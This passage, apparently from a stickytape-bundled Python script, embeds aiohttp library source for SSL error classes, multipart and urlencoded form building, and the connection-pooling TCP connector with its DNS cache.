ssl_errors = (ssl.SSLError,)\r\n    ssl_error_bases = (ClientSSLError, ssl.SSLError)\r\nelse:  # pragma: no cover\r\n    cert_errors = tuple()\r\n    cert_errors_bases = (\r\n        ClientSSLError,\r\n        ValueError,\r\n    )\r\n\r\n    ssl_errors = tuple()\r\n    ssl_error_bases = (ClientSSLError,)\r\n\r\n\r\nclass ClientConnectorSSLError(*ssl_error_bases):  # type: ignore[misc]\r\n    """Response ssl error."""\r\n\r\n\r\nclass ClientConnectorCertificateError(*cert_errors_bases):  # type: ignore[misc]\r\n    """Response certificate error."""\r\n\r\n    def __init__(\r\n        self, connection_key: ConnectionKey, certificate_error: Exception\r\n    ) -> None:\r\n        self._conn_key = connection_key\r\n        self._certificate_error = certificate_error\r\n        self.args = (connection_key, certificate_error)\r\n\r\n    @property\r\n    def certificate_error(self) -> Exception:\r\n        return self._certificate_error\r\n\r\n    @property\r\n    def host(self) -> str:\r\n        return self._conn_key.host\r\n\r\n    @property\r\n    def port(self) -> Optional[int]:\r\n        return self._conn_key.port\r\n\r\n    @property\r\n    def ssl(self) -> bool:\r\n        return self._conn_key.is_ssl\r\n\r\n    def __str__(self) -> str:\r\n        return (\r\n            "Cannot connect to host {0.host}:{0.port} ssl:{0.ssl} "\r\n            "[{0.certificate_error.__class__.__name__}: "\r\n            "{0.certificate_error.args}]".format(self)\r\n        )\r\n')
    __stickytape_write_module('aiohttp/formdata.py', b'import io\r\nfrom typing import Any, Iterable, List, Optional\r\nfrom urllib.parse import urlencode\r\n\r\nfrom multidict import MultiDict, MultiDictProxy\r\n\r\nfrom . import hdrs, multipart, payload\r\nfrom .helpers import guess_filename\r\nfrom .payload import Payload\r\n\r\n__all__ = ("FormData",)\r\n\r\n\r\nclass FormData:\r\n    """Helper class for form body generation.\r\n\r\n    Supports multipart/form-data and application/x-www-form-urlencoded.\r\n    """\r\n\r\n    def __init__(\r\n        self,\r\n        fields: Iterable[Any] = (),\r\n        quote_fields: bool = True,\r\n        charset: Optional[str] = None,\r\n    ) -> None:\r\n        self._writer = multipart.MultipartWriter("form-data")\r\n        self._fields = []  # type: List[Any]\r\n        self._is_multipart = False\r\n        self._is_processed = False\r\n        self._quote_fields = quote_fields\r\n        self._charset = charset\r\n\r\n        if isinstance(fields, dict):\r\n            fields = list(fields.items())\r\n        elif not isinstance(fields, (list, tuple)):\r\n            fields = (fields,)\r\n        self.add_fields(*fields)\r\n\r\n    @property\r\n    def is_multipart(self) -> bool:\r\n        return self._is_multipart\r\n\r\n    def add_field(\r\n        self,\r\n        name: str,\r\n        value: Any,\r\n        *,\r\n        content_type: Optional[str] = None,\r\n        filename: Optional[str] = None,\r\n        content_transfer_encoding: Optional[str] = None,\r\n    ) -> None:\r\n\r\n        if isinstance(value, io.IOBase):\r\n            self._is_multipart = True\r\n        elif isinstance(value, (bytes, bytearray, memoryview)):\r\n            if filename is None and content_transfer_encoding is None:\r\n                filename = name\r\n\r\n        type_options = MultiDict({"name": name})  # type: MultiDict[str]\r\n        if filename is not None and not isinstance(filename, str):\r\n            raise TypeError(\r\n                "filename must be an instance of str. " "Got: %s" % filename\r\n            )\r\n        if filename is None and isinstance(value, io.IOBase):\r\n            filename = guess_filename(value, name)\r\n        if filename is not None:\r\n            type_options["filename"] = filename\r\n            self._is_multipart = True\r\n\r\n        headers = {}\r\n        if content_type is not None:\r\n            if not isinstance(content_type, str):\r\n                raise TypeError(\r\n                    "content_type must be an instance of str. " "Got: %s" % content_type\r\n                )\r\n            headers[hdrs.CONTENT_TYPE] = content_type\r\n            self._is_multipart = True\r\n        if content_transfer_encoding is not None:\r\n            if not isinstance(content_transfer_encoding, str):\r\n                raise TypeError(\r\n                    "content_transfer_encoding must be an instance"\r\n                    " of str. Got: %s" % content_transfer_encoding\r\n                )\r\n            headers[hdrs.CONTENT_TRANSFER_ENCODING] = content_transfer_encoding\r\n            self._is_multipart = True\r\n\r\n        self._fields.append((type_options, headers, value))\r\n\r\n    def add_fields(self, *fields: Any) -> None:\r\n        to_add = list(fields)\r\n\r\n        while to_add:\r\n            rec = to_add.pop(0)\r\n\r\n            if isinstance(rec, io.IOBase):\r\n                k = guess_filename(rec, "unknown")\r\n                self.add_field(k, rec)  # type: ignore[arg-type]\r\n\r\n            elif isinstance(rec, (MultiDictProxy, MultiDict)):\r\n                to_add.extend(rec.items())\r\n\r\n            elif isinstance(rec, (list, tuple)) and len(rec) == 2:\r\n                k, fp = rec\r\n                self.add_field(k, fp)  # type: ignore[arg-type]\r\n\r\n            else:\r\n                raise TypeError(\r\n                    "Only io.IOBase, multidict and (name, file) "\r\n                    "pairs allowed, use .add_field() for passing "\r\n                    "more complex parameters, got {!r}".format(rec)\r\n                )\r\n\r\n    def _gen_form_urlencoded(self) -> payload.BytesPayload:\r\n        # form data (x-www-form-urlencoded)\r\n        data = []\r\n        for type_options, _, value in self._fields:\r\n            data.append((type_options["name"], value))\r\n\r\n        charset = self._charset if self._charset is not None else "utf-8"\r\n\r\n        if charset == "utf-8":\r\n            content_type = "application/x-www-form-urlencoded"\r\n        else:\r\n            content_type = "application/x-www-form-urlencoded; " "charset=%s" % charset\r\n\r\n        return payload.BytesPayload(\r\n            urlencode(data, doseq=True, encoding=charset).encode(),\r\n            content_type=content_type,\r\n        )\r\n\r\n    def _gen_form_data(self) -> multipart.MultipartWriter:\r\n        """Encode a list of fields using the multipart/form-data MIME format"""\r\n        if self._is_processed:\r\n            raise RuntimeError("Form data has been processed already")\r\n        for dispparams, headers, value in self._fields:\r\n            try:\r\n                if hdrs.CONTENT_TYPE in headers:\r\n                    part = payload.get_payload(\r\n                        value,\r\n                        content_type=headers[hdrs.CONTENT_TYPE],\r\n                        headers=headers,\r\n                        encoding=self._charset,\r\n                    )\r\n                else:\r\n                    part = payload.get_payload(\r\n                        value, headers=headers, encoding=self._charset\r\n                    )\r\n            except Exception as exc:\r\n                raise TypeError(\r\n                    "Can not serialize value type: %r\\n "\r\n                    "headers: %r\\n value: %r" % (type(value), headers, value)\r\n                ) from exc\r\n\r\n            if dispparams:\r\n                part.set_content_disposition(\r\n                    "form-data", quote_fields=self._quote_fields, **dispparams\r\n                )\r\n                # FIXME cgi.FieldStorage doesn\'t likes body parts with\r\n                # Content-Length which were sent via chunked transfer encoding\r\n                assert part.headers is not None\r\n                part.headers.popall(hdrs.CONTENT_LENGTH, None)\r\n\r\n            self._writer.append_payload(part)\r\n\r\n        self._is_processed = True\r\n        return self._writer\r\n\r\n    def __call__(self) -> Payload:\r\n        if self._is_multipart:\r\n            return self._gen_form_data()\r\n        else:\r\n            return self._gen_form_urlencoded()\r\n')
    __stickytape_write_module('aiohttp/connector.py', b'import asyncio\r\nimport functools\r\nimport random\r\nimport sys\r\nimport traceback\r\nimport warnings\r\nfrom collections import defaultdict, deque\r\nfrom contextlib import suppress\r\nfrom http.cookies import SimpleCookie\r\nfrom itertools import cycle, islice\r\nfrom time import monotonic\r\nfrom types import TracebackType\r\nfrom typing import (\r\n    TYPE_CHECKING,\r\n    Any,\r\n    Awaitable,\r\n    Callable,\r\n    DefaultDict,\r\n    Dict,\r\n    Iterator,\r\n    List,\r\n    Optional,\r\n    Set,\r\n    Tuple,\r\n    Type,\r\n    Union,\r\n    cast,\r\n)\r\n\r\nimport attr\r\n\r\nfrom . import hdrs, helpers\r\nfrom .abc import AbstractResolver\r\nfrom .client_exceptions import (\r\n    ClientConnectionError,\r\n    ClientConnectorCertificateError,\r\n    ClientConnectorError,\r\n    ClientConnectorSSLError,\r\n    ClientHttpProxyError,\r\n    ClientProxyConnectionError,\r\n    ServerFingerprintMismatch,\r\n    UnixClientConnectorError,\r\n    cert_errors,\r\n    ssl_errors,\r\n)\r\nfrom .client_proto import ResponseHandler\r\nfrom .client_reqrep import ClientRequest, Fingerprint, _merge_ssl_params\r\nfrom .helpers import (\r\n    PY_36,\r\n    ceil_timeout,\r\n    get_running_loop,\r\n    is_ip_address,\r\n    noop,\r\n    sentinel,\r\n)\r\nfrom .http import RESPONSES\r\nfrom .locks import EventResultOrError\r\nfrom .resolver import DefaultResolver\r\n\r\ntry:\r\n    import ssl\r\n\r\n    SSLContext = ssl.SSLContext\r\nexcept ImportError:  # pragma: no cover\r\n    ssl = None  # type: ignore[assignment]\r\n    SSLContext = object  # type: ignore[misc,assignment]\r\n\r\n\r\n__all__ = ("BaseConnector", "TCPConnector", "UnixConnector", "NamedPipeConnector")\r\n\r\n\r\nif TYPE_CHECKING:  # pragma: no cover\r\n    from .client import ClientTimeout\r\n    from .client_reqrep import ConnectionKey\r\n    from .tracing import Trace\r\n\r\n\r\nclass _DeprecationWaiter:\r\n    __slots__ = ("_awaitable", "_awaited")\r\n\r\n    def __init__(self, awaitable: Awaitable[Any]) -> None:\r\n        self._awaitable = awaitable\r\n        self._awaited = False\r\n\r\n    def __await__(self) -> Any:\r\n        self._awaited = True\r\n        return self._awaitable.__await__()\r\n\r\n    def __del__(self) -> None:\r\n        if not self._awaited:\r\n            warnings.warn(\r\n                "Connector.close() is a coroutine, "\r\n                "please use await connector.close()",\r\n                DeprecationWarning,\r\n            )\r\n\r\n\r\nclass Connection:\r\n\r\n    _source_traceback = None\r\n    _transport = None\r\n\r\n    def __init__(\r\n        self,\r\n        connector: "BaseConnector",\r\n        key: "ConnectionKey",\r\n        protocol: ResponseHandler,\r\n        loop: asyncio.AbstractEventLoop,\r\n    ) -> None:\r\n        self._key = key\r\n        self._connector = connector\r\n        self._loop = loop\r\n        self._protocol = protocol  # type: Optional[ResponseHandler]\r\n        self._callbacks = []  # type: List[Callable[[], None]]\r\n\r\n        if loop.get_debug():\r\n            self._source_traceback = traceback.extract_stack(sys._getframe(1))\r\n\r\n    def __repr__(self) -> str:\r\n        return f"Connection<{self._key}>"\r\n\r\n    def __del__(self, _warnings: Any = warnings) -> None:\r\n        if self._protocol is not None:\r\n            if PY_36:\r\n                kwargs = {"source": self}\r\n            else:\r\n                kwargs = {}\r\n            _warnings.warn(f"Unclosed connection {self!r}", ResourceWarning, **kwargs)\r\n            if self._loop.is_closed():\r\n                return\r\n\r\n            self._connector._release(self._key, self._protocol, should_close=True)\r\n\r\n            context = {"client_connection": self, "message": "Unclosed connection"}\r\n            if self._source_traceback is not None:\r\n                context["source_traceback"] = self._source_traceback\r\n            self._loop.call_exception_handler(context)\r\n\r\n    @property\r\n    def loop(self) -> asyncio.AbstractEventLoop:\r\n        warnings.warn(\r\n            "connector.loop property is deprecated", DeprecationWarning, stacklevel=2\r\n        )\r\n        return self._loop\r\n\r\n    @property\r\n    def transport(self) -> Optional[asyncio.Transport]:\r\n        if self._protocol is None:\r\n            return None\r\n        return self._protocol.transport\r\n\r\n    @property\r\n    def protocol(self) -> Optional[ResponseHandler]:\r\n        return self._protocol\r\n\r\n    def add_callback(self, callback: Callable[[], None]) -> None:\r\n        if callback is not None:\r\n            self._callbacks.append(callback)\r\n\r\n    def _notify_release(self) -> None:\r\n        callbacks, self._callbacks = self._callbacks[:], []\r\n\r\n        for cb in callbacks:\r\n            with suppress(Exception):\r\n                cb()\r\n\r\n    def close(self) -> None:\r\n        self._notify_release()\r\n\r\n        if self._protocol is not None:\r\n            self._connector._release(self._key, self._protocol, should_close=True)\r\n            self._protocol = None\r\n\r\n    def release(self) -> None:\r\n        self._notify_release()\r\n\r\n        if self._protocol is not None:\r\n            self._connector._release(\r\n                self._key, self._protocol, should_close=self._protocol.should_close\r\n            )\r\n            self._protocol = None\r\n\r\n    @property\r\n    def closed(self) -> bool:\r\n        return self._protocol is None or not self._protocol.is_connected()\r\n\r\n\r\nclass _TransportPlaceholder:\r\n    """placeholder for BaseConnector.connect function"""\r\n\r\n    def close(self) -> None:\r\n        pass\r\n\r\n\r\nclass BaseConnector:\r\n    """Base connector class.\r\n\r\n    keepalive_timeout - (optional) Keep-alive timeout.\r\n    force_close - Set to True to force close and do reconnect\r\n        after each request (and between redirects).\r\n    limit - The total number of simultaneous connections.\r\n    limit_per_host - Number of simultaneous connections to one host.\r\n    enable_cleanup_closed - Enables clean-up closed ssl transports.\r\n                            Disabled by default.\r\n    loop - Optional event loop.\r\n    """\r\n\r\n    _closed = True  # prevent AttributeError in __del__ if ctor was failed\r\n    _source_traceback = None\r\n\r\n    # abort transport after 2 seconds (cleanup broken connections)\r\n    _cleanup_closed_period = 2.0\r\n\r\n    def __init__(\r\n        self,\r\n        *,\r\n        keepalive_timeout: Union[object, None, float] = sentinel,\r\n        force_close: bool = False,\r\n        limit: int = 100,\r\n        limit_per_host: int = 0,\r\n        enable_cleanup_closed: bool = False,\r\n        loop: Optional[asyncio.AbstractEventLoop] = None,\r\n    ) -> None:\r\n\r\n        if force_close:\r\n            if keepalive_timeout is not None and keepalive_timeout is not sentinel:\r\n                raise ValueError(\r\n                    "keepalive_timeout cannot " "be set if force_close is True"\r\n                )\r\n        else:\r\n            if keepalive_timeout is sentinel:\r\n                keepalive_timeout = 15.0\r\n\r\n        loop = get_running_loop(loop)\r\n\r\n        self._closed = False\r\n        if loop.get_debug():\r\n            self._source_traceback = traceback.extract_stack(sys._getframe(1))\r\n\r\n        self._conns = (\r\n            {}\r\n        )  # type: Dict[ConnectionKey, List[Tuple[ResponseHandler, float]]]\r\n        self._limit = limit\r\n        self._limit_per_host = limit_per_host\r\n        self._acquired = set()  # type: Set[ResponseHandler]\r\n        self._acquired_per_host = defaultdict(\r\n            set\r\n        )  # type: DefaultDict[ConnectionKey, Set[ResponseHandler]]\r\n        self._keepalive_timeout = cast(float, keepalive_timeout)\r\n        self._force_close = force_close\r\n\r\n        # {host_key: FIFO list of waiters}\r\n        self._waiters = defaultdict(deque)  # type: ignore[var-annotated]\r\n\r\n        self._loop = loop\r\n        self._factory = functools.partial(ResponseHandler, loop=loop)\r\n\r\n        self.cookies = SimpleCookie()  # type: SimpleCookie[str]\r\n\r\n        # start keep-alive connection cleanup task\r\n        self._cleanup_handle: Optional[asyncio.TimerHandle] = None\r\n\r\n        # start cleanup closed transports task\r\n        self._cleanup_closed_handle: Optional[asyncio.TimerHandle] = None\r\n        self._cleanup_closed_disabled = not enable_cleanup_closed\r\n        self._cleanup_closed_transports = []  # type: List[Optional[asyncio.Transport]]\r\n        self._cleanup_closed()\r\n\r\n    def __del__(self, _warnings: Any = warnings) -> None:\r\n        if self._closed:\r\n            return\r\n        if not self._conns:\r\n            return\r\n\r\n        conns = [repr(c) for c in self._conns.values()]\r\n\r\n        self._close()\r\n\r\n        if PY_36:\r\n            kwargs = {"source": self}\r\n        else:\r\n            kwargs = {}\r\n        _warnings.warn(f"Unclosed connector {self!r}", ResourceWarning, **kwargs)\r\n        context = {\r\n            "connector": self,\r\n            "connections": conns,\r\n            "message": "Unclosed connector",\r\n        }\r\n        if self._source_traceback is not None:\r\n            context["source_traceback"] = self._source_traceback\r\n        self._loop.call_exception_handler(context)\r\n\r\n    def __enter__(self) -> "BaseConnector":\r\n        warnings.warn(\r\n            \'"witn Connector():" is deprecated, \'\r\n            \'use "async with Connector():" instead\',\r\n            DeprecationWarning,\r\n        )\r\n        return self\r\n\r\n    def __exit__(self, *exc: Any) -> None:\r\n        self.close()\r\n\r\n    async def __aenter__(self) -> "BaseConnector":\r\n        return self\r\n\r\n    async def __aexit__(\r\n        self,\r\n        exc_type: Optional[Type[BaseException]] = None,\r\n        exc_value: Optional[BaseException] = None,\r\n        exc_traceback: Optional[TracebackType] = None,\r\n    ) -> None:\r\n        await self.close()\r\n\r\n    @property\r\n    def force_close(self) -> bool:\r\n        """Ultimately close connection on releasing if True."""\r\n        return self._force_close\r\n\r\n    @property\r\n    def limit(self) -> int:\r\n        """The total number for simultaneous connections.\r\n\r\n        If limit is 0 the connector has no limit.\r\n        The default limit size is 100.\r\n        """\r\n        return self._limit\r\n\r\n    @property\r\n    def limit_per_host(self) -> int:\r\n        """The limit for simultaneous connections to the same endpoint.\r\n\r\n        Endpoints are the same if they are have equal\r\n        (host, port, is_ssl) triple.\r\n        """\r\n        return self._limit_per_host\r\n\r\n    def _cleanup(self) -> None:\r\n        """Cleanup unused transports."""\r\n        if self._cleanup_handle:\r\n            self._cleanup_handle.cancel()\r\n            # _cleanup_handle should be unset, otherwise _release() will not\r\n            # recreate it ever!\r\n            self._cleanup_handle = None\r\n\r\n        now = self._loop.time()\r\n        timeout = self._keepalive_timeout\r\n\r\n        if self._conns:\r\n            connections = {}\r\n            deadline = now - timeout\r\n            for key, conns in self._conns.items():\r\n                alive = []\r\n                for proto, use_time in conns:\r\n                    if proto.is_connected():\r\n                        if use_time - deadline < 0:\r\n                            transport = proto.transport\r\n                            proto.close()\r\n                            if key.is_ssl and not self._cleanup_closed_disabled:\r\n                                self._cleanup_closed_transports.append(transport)\r\n                        else:\r\n                            alive.append((proto, use_time))\r\n                    else:\r\n                        transport = proto.transport\r\n                        proto.close()\r\n                        if key.is_ssl and not self._cleanup_closed_disabled:\r\n                            self._cleanup_closed_transports.append(transport)\r\n\r\n                if alive:\r\n                    connections[key] = alive\r\n\r\n            self._conns = connections\r\n\r\n        if self._conns:\r\n            self._cleanup_handle = helpers.weakref_handle(\r\n                self, "_cleanup", timeout, self._loop\r\n            )\r\n\r\n    def _drop_acquired_per_host(\r\n        self, key: "ConnectionKey", val: ResponseHandler\r\n    ) -> None:\r\n        acquired_per_host = self._acquired_per_host\r\n        if key not in acquired_per_host:\r\n            return\r\n        conns = acquired_per_host[key]\r\n        conns.remove(val)\r\n        if not conns:\r\n            del self._acquired_per_host[key]\r\n\r\n    def _cleanup_closed(self) -> None:\r\n        """Double confirmation for transport close.\r\n\r\n        Some broken ssl servers may leave socket open without proper close.\r\n        """\r\n        if self._cleanup_closed_handle:\r\n            self._cleanup_closed_handle.cancel()\r\n\r\n        for transport in self._cleanup_closed_transports:\r\n            if transport is not None:\r\n                transport.abort()\r\n\r\n        self._cleanup_closed_transports = []\r\n\r\n        if not self._cleanup_closed_disabled:\r\n            self._cleanup_closed_handle = helpers.weakref_handle(\r\n                self, "_cleanup_closed", self._cleanup_closed_period, self._loop\r\n            )\r\n\r\n    def close(self) -> Awaitable[None]:\r\n        """Close all opened transports."""\r\n        self._close()\r\n        return _DeprecationWaiter(noop())\r\n\r\n    def _close(self) -> None:\r\n        if self._closed:\r\n            return\r\n\r\n        self._closed = True\r\n\r\n        try:\r\n            if self._loop.is_closed():\r\n                return\r\n\r\n            # cancel cleanup task\r\n            if self._cleanup_handle:\r\n                self._cleanup_handle.cancel()\r\n\r\n            # cancel cleanup close task\r\n            if self._cleanup_closed_handle:\r\n                self._cleanup_closed_handle.cancel()\r\n\r\n            for data in self._conns.values():\r\n                for proto, t0 in data:\r\n                    proto.close()\r\n\r\n            for proto in self._acquired:\r\n                proto.close()\r\n\r\n            for transport in self._cleanup_closed_transports:\r\n                if transport is not None:\r\n                    transport.abort()\r\n\r\n        finally:\r\n            self._conns.clear()\r\n            self._acquired.clear()\r\n            self._waiters.clear()\r\n            self._cleanup_handle = None\r\n            self._cleanup_closed_transports.clear()\r\n            self._cleanup_closed_handle = None\r\n\r\n    @property\r\n    def closed(self) -> bool:\r\n        """Is connector closed.\r\n\r\n        A readonly property.\r\n        """\r\n        return self._closed\r\n\r\n    def _available_connections(self, key: "ConnectionKey") -> int:\r\n        """\r\n        Return number of available connections.\r\n\r\n        The limit, limit_per_host and the connection key are taken into account.\r\n\r\n        If it returns less than 1 means that there are no connections\r\n        available.\r\n        """\r\n        if self._limit:\r\n            # total calc available connections\r\n            available = self._limit - len(self._acquired)\r\n\r\n            # check limit per host\r\n            if (\r\n                self._limit_per_host\r\n                and available > 0\r\n                and key in self._acquired_per_host\r\n            ):\r\n                acquired = self._acquired_per_host.get(key)\r\n                assert acquired is not None\r\n                available = self._limit_per_host - len(acquired)\r\n\r\n        elif self._limit_per_host and key in self._acquired_per_host:\r\n            # check limit per host\r\n            acquired = self._acquired_per_host.get(key)\r\n            assert acquired is not None\r\n            available = self._limit_per_host - len(acquired)\r\n        else:\r\n            available = 1\r\n\r\n        return available\r\n\r\n    async def connect(\r\n        self, req: "ClientRequest", traces: List["Trace"], timeout: "ClientTimeout"\r\n    ) -> Connection:\r\n        """Get from pool or create new connection."""\r\n        key = req.connection_key\r\n        available = self._available_connections(key)\r\n\r\n        # Wait if there are no available connections or if there are/were\r\n        # waiters (i.e. don\'t steal connection from a waiter about to wake up)\r\n        if available <= 0 or key in self._waiters:\r\n            fut = self._loop.create_future()\r\n\r\n            # This connection will now count towards the limit.\r\n            self._waiters[key].append(fut)\r\n\r\n            if traces:\r\n                for trace in traces:\r\n                    await trace.send_connection_queued_start()\r\n\r\n            try:\r\n                await fut\r\n            except BaseException as e:\r\n                if key in self._waiters:\r\n                    # remove a waiter even if it was cancelled, normally it\'s\r\n                    #  removed when it\'s notified\r\n                    try:\r\n                        self._waiters[key].remove(fut)\r\n                    except ValueError:  # fut may no longer be in list\r\n                        pass\r\n\r\n                raise e\r\n            finally:\r\n                if key in self._waiters and not self._waiters[key]:\r\n                    del self._waiters[key]\r\n\r\n            if traces:\r\n                for trace in traces:\r\n                    await trace.send_connection_queued_end()\r\n\r\n        proto = self._get(key)\r\n        if proto is None:\r\n            placeholder = cast(ResponseHandler, _TransportPlaceholder())\r\n            self._acquired.add(placeholder)\r\n            self._acquired_per_host[key].add(placeholder)\r\n\r\n            if traces:\r\n                for trace in traces:\r\n                    await trace.send_connection_create_start()\r\n\r\n            try:\r\n                proto = await self._create_connection(req, traces, timeout)\r\n                if self._closed:\r\n                    proto.close()\r\n                    raise ClientConnectionError("Connector is closed.")\r\n            except BaseException:\r\n                if not self._closed:\r\n                    self._acquired.remove(placeholder)\r\n                    self._drop_acquired_per_host(key, placeholder)\r\n                    self._release_waiter()\r\n                raise\r\n            else:\r\n                if not self._closed:\r\n                    self._acquired.remove(placeholder)\r\n                    self._drop_acquired_per_host(key, placeholder)\r\n\r\n            if traces:\r\n                for trace in traces:\r\n                    await trace.send_connection_create_end()\r\n        else:\r\n            if traces:\r\n                # Acquire the connection to prevent race conditions with limits\r\n                placeholder = cast(ResponseHandler, _TransportPlaceholder())\r\n                self._acquired.add(placeholder)\r\n                self._acquired_per_host[key].add(placeholder)\r\n                for trace in traces:\r\n                    await trace.send_connection_reuseconn()\r\n                self._acquired.remove(placeholder)\r\n                self._drop_acquired_per_host(key, placeholder)\r\n\r\n        self._acquired.add(proto)\r\n        self._acquired_per_host[key].add(proto)\r\n        return Connection(self, key, proto, self._loop)\r\n\r\n    def _get(self, key: "ConnectionKey") -> Optional[ResponseHandler]:\r\n        try:\r\n            conns = self._conns[key]\r\n        except KeyError:\r\n            return None\r\n\r\n        t1 = self._loop.time()\r\n        while conns:\r\n            proto, t0 = conns.pop()\r\n            if proto.is_connected():\r\n                if t1 - t0 > self._keepalive_timeout:\r\n                    transport = proto.transport\r\n                    proto.close()\r\n                    # only for SSL transports\r\n                    if key.is_ssl and not self._cleanup_closed_disabled:\r\n                        self._cleanup_closed_transports.append(transport)\r\n                else:\r\n                    if not conns:\r\n                        # The very last connection was reclaimed: drop the key\r\n                        del self._conns[key]\r\n                    return proto\r\n            else:\r\n                transport = proto.transport\r\n                proto.close()\r\n                if key.is_ssl and not self._cleanup_closed_disabled:\r\n                    self._cleanup_closed_transports.append(transport)\r\n\r\n        # No more connections: drop the key\r\n        del self._conns[key]\r\n        return None\r\n\r\n    def _release_waiter(self) -> None:\r\n        """\r\n        Iterates over all waiters until one to be released is found.\r\n\r\n        The one to be released is not finsihed and\r\n        belongs to a host that has available connections.\r\n        """\r\n        if not self._waiters:\r\n            return\r\n\r\n        # Having the dict keys ordered this avoids to iterate\r\n        # at the same order at each call.\r\n        queues = list(self._waiters.keys())\r\n        random.shuffle(queues)\r\n\r\n        for key in queues:\r\n            if self._available_connections(key) < 1:\r\n                continue\r\n\r\n            waiters = self._waiters[key]\r\n            while waiters:\r\n                waiter = waiters.popleft()\r\n                if not waiter.done():\r\n                    waiter.set_result(None)\r\n                    return\r\n\r\n    def _release_acquired(self, key: "ConnectionKey", proto: ResponseHandler) -> None:\r\n        if self._closed:\r\n            # acquired connection is already released on connector closing\r\n            return\r\n\r\n        try:\r\n            self._acquired.remove(proto)\r\n            self._drop_acquired_per_host(key, proto)\r\n        except KeyError:  # pragma: no cover\r\n            # this may be result of undetermenistic order of objects\r\n            # finalization due garbage collection.\r\n            pass\r\n        else:\r\n            self._release_waiter()\r\n\r\n    def _release(\r\n        self,\r\n        key: "ConnectionKey",\r\n        protocol: ResponseHandler,\r\n        *,\r\n        should_close: bool = False,\r\n    ) -> None:\r\n        if self._closed:\r\n            # acquired connection is already released on connector closing\r\n            return\r\n\r\n        self._release_acquired(key, protocol)\r\n\r\n        if self._force_close:\r\n            should_close = True\r\n\r\n        if should_close or protocol.should_close:\r\n            transport = protocol.transport\r\n            protocol.close()\r\n\r\n            if key.is_ssl and not self._cleanup_closed_disabled:\r\n                self._cleanup_closed_transports.append(transport)\r\n        else:\r\n            conns = self._conns.get(key)\r\n            if conns is None:\r\n                conns = self._conns[key] = []\r\n            conns.append((protocol, self._loop.time()))\r\n\r\n            if self._cleanup_handle is None:\r\n                self._cleanup_handle = helpers.weakref_handle(\r\n                    self, "_cleanup", self._keepalive_timeout, self._loop\r\n                )\r\n\r\n    async def _create_connection(\r\n        self, req: "ClientRequest", traces: List["Trace"], timeout: "ClientTimeout"\r\n    ) -> ResponseHandler:\r\n        raise NotImplementedError()\r\n\r\n\r\nclass _DNSCacheTable:\r\n    def __init__(self, ttl: Optional[float] = None) -> None:\r\n        self._addrs_rr = (\r\n            {}\r\n        )  # type: Dict[Tuple[str, int], Tuple[Iterator[Dict[str, Any]], int]]\r\n        self._timestamps = {}  # type: Dict[Tuple[str, int], float]\r\n        self._ttl = ttl\r\n\r\n    def __contains__(self, host: object) -> bool:\r\n        return host in self._addrs_rr\r\n\r\n    def add(self, key: Tuple[str, int], addrs: List[Dict[str, Any]]) -> None:\r\n        self._addrs_rr[key] = (cycle(addrs), len(addrs))\r\n\r\n        if self._ttl:\r\n            self._timestamps[key] = monotonic()\r\n\r\n    def remove(self, key: Tuple[str, int]) -> None:\r\n        self._addrs_rr.pop(key, None)\r\n\r\n        if self._ttl:\r\n            self._timestamps.pop(key, None)\r\n\r\n    def clear(self) -> None:\r\n        self._addrs_rr.clear()\r\n        self._timestamps.clear()\r\n\r\n    def next_addrs(self, key: Tuple[str, int]) -> List[Dict[str, Any]]:\r\n        loop, length = self._addrs_rr[key]\r\n        addrs = list(islice(loop, length))\r\n        # Consume one more element to shift internal state of `cycle`\r\n        next(loop)\r\n        return addrs\r\n\r\n    def expired(self, key: Tuple[str, int]) -> bool:\r\n        if self._ttl is None:\r\n            return False\r\n\r\n        return self._timestamps[key] + self._ttl < monotonic()\r\n\r\n\r\nclass TCPConnector(BaseConnector):\r\n    """TCP connector.\r\n\r\n    verify_ssl - Set to True to check ssl certifications.\r\n    fingerprint - Pass the binary sha256\r\n        digest of the expected certificate in DER format to verify\r\n        that the certificate the server presents matches. See also\r\n        https://en.wikipedia.org/wiki/Transport_Layer_Security#Certificate_pinning\r\n    resolver - Enable DNS lookups and use this\r\n        resolver\r\n    use_dns_cache - Use memory cache for DNS lookups.\r\n    ttl_dns_cache - Max seconds having cached a DNS entry, None forever.\r\n    family - socket address family\r\n    local_addr - local tuple of (host, port) to bind socket to\r\n\r\n    keepalive_timeout - (optional) Keep-alive timeout.\r\n    force_close - Set to True to force close and do reconnect\r\n        after each request (and between redirects).\r\n    limit - The total number of simultaneous connections.\r\n    limit_per_host - Number of simultaneous connections to one host.\r\n    enable_cleanup_closed - Enables clean-up closed ssl transports.\r\n                            Disabled by default.\r\n    loop - Optional event loop.\r\n    """\r\n\r\n    def __init__(\r\n        self,\r\n        *,\r\n        verify_ssl: bool = True,\r\n        fingerprint: Optional[bytes] = None,\r\n        use_dns_cache: bool = True,\r\n        ttl_dns_cache: Optional[int] = 10,\r\n        family: int = 0,\r\n        ssl_context: Optional[SSLContext] = None,\r\n        ssl: Union[None, bool, Fingerprint, SSLContext] = None,\r\n        local_addr: Optional[Tuple[str, int]] = None,\r\n        resolver: Optional[AbstractResolver] = None,\r\n        keepalive_timeout: Union[None, float, object] = sentinel,\r\n        force_close: bool = False,\r\n        limit: int = 100,\r\n        limit_per_host: int = 0,\r\n        enable_cleanup_closed: bool = False,\r\n        loop: Optional[asyncio.AbstractEventLoop] = None,\r\n    ):\r\n        super().__init__(\r\n            keepalive_timeout=keepalive_timeout,\r\n            force_close=force_close,\r\n            limit=limit,\r\n            limit_per_host=limit_per_host,\r\n            enable_cleanup_closed=enable_cleanup_closed,\r\n            loop=loop,\r\n        )\r\n\r\n        self._ssl = _merge_ssl_params(ssl, verify_ssl, ssl_context, fingerprint)\r\n        if resolver is None:\r\n            resolver = DefaultResolver(loop=self._loop)\r\n        self._resolver = resolver\r\n\r\n        self._use_dns_cache = use_dns_cache\r\n        self._cached_hosts = _DNSCacheTable(ttl=ttl_dns_cache)\r\n        self._throttle_dns_events = (\r\n            {}\r\n        )  # type: Dict[Tuple[str, int], EventResultOrError]\r\n        self._family = family\r\n        self._local_addr = local_addr\r\n\r\n    def close(self) -> Awaitable[None]:\r\n        """Close all ongoing DNS calls."""\r\n        for ev in self._throttle_dns_events.values():\r\n            ev.cancel()\r\n\r\n        return super().close()\r\n\r\n    @property\r\n    def family(self) -> int:\r\n        """Socket family like AF_INET."""\r\n        return self._family\r\n\r\n    @property\r\n    def use_dns_cache(self) -> bool:\r\n        """True if local DNS caching is enabled."""\r\n        return self._use_dns_cache\r\n\r\n    def clear_dns_cache(\r\n        self, host: Optional[str] = None, port: Optional[int] = None\r\n    ) -> None:\r\n        """Remove specified host/port or clear all dns local cache."""\r\n        if host is not None and port is not 